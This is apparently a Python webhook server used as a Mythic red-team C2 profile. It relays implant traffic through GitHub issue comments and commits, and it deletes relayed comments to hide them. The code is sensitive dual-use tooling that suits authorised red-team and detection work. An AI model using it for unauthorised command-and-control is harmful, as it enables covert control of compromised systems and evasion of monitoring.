#!/usr/local/bin/python
import aiohttp
import asyncio
import github_client as github_client
import hashlib
import hmac
import json
import logging
import mythic_client as mythic_client
import mythic_container
import os
import sys
from config import config
from mythic_container.logging import logger
from quart import Quart, request, jsonify


app = Quart(__name__)

log = logging.getLogger("quart.app")
log.setLevel(logging.INFO)


def verify_signature(payload, signature, secret):
    mac = hmac.new(secret.encode(), msg=payload, digestmod=hashlib.sha256)
    return hmac.compare_digest("sha256=" + mac.hexdigest(), signature)


@app.route("/", methods=["POST"])
async def github_webhook():
    # Verify request came from intended GitHub Webhook
    signature = request.headers.get("X-Hub-Signature-256")
    if signature is None:
        log.info("Basic web request with no signature")
        return jsonify({"error": "Missing signature"}), 400
    if not verify_signature(await request.data, signature, config["webhook_secret"]):
        return jsonify({"error": "Invalid signature"}), 400

    # Process GitHub Webhook message
    event = request.headers.get("X-GitHub-Event")
    payload = await request.json
    if event == "issue_comment":
        action = payload["action"]
        issue = payload["issue"]
        comment = payload["comment"]

        if action == "created" and issue["number"] == config["client_issue"]:
            log.info(comment["body"])
            resp = await mythic_client.send_to_mythic(comment["body"])
            await github_client.delete_comment(comment["id"])
            #mythic_container.MythicGoRPC.send_mythic_rpc_operationeventlog_create.MythicRPCOperationEventLogCreateMessage(
            #    OperationId=0,Message="test"
            #)
            await github_client.post_comment(resp)

    elif event == "push":
        commit = payload["head_commit"]
        if commit and "server.txt" in commit["added"]:
            uuid  = commit["message"]
            myth_msg = await github_client.read_file(uuid)
            myth_resp = await mythic_client.send_to_mythic(myth_msg)
            await github_client.push(uuid, myth_resp)

    return jsonify({"status": "success"}), 200


async def main():
    # Load configuration
    global config
    log.info("Loading configuration")
    with open("config.json", "rb") as config_file:
        config.update(json.loads(config_file.read().decode("utf-8")))
    config["mythic_address"] = os.environ["MYTHIC_ADDRESS"]
    sys.stdout.flush()
    
    # Start Quart server to receive GitHub webhook messages
    log.info(f"Starting web server at 0.0.0.0:{config['port']}")
    await app.run_task(host="0.0.0.0", port=config["port"])


asyncio.run(main())
